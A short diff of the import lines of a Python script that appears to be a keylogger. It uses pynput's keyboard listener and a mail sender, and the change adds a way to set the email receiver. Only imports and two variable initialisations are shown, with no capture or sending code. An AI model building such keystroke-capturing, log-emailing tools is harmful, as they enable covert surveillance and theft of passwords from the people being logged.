@@ -1,9 +1,8 @@
 from pynput import keyboard
 import os
 import logging
-from dotenv import load_dotenv
 import convertLog 
-from PyMailSender import MailSender
+from PyMailSender import MailSender, set_email_of_receiver
 
 log = "";
 message_status = 0;
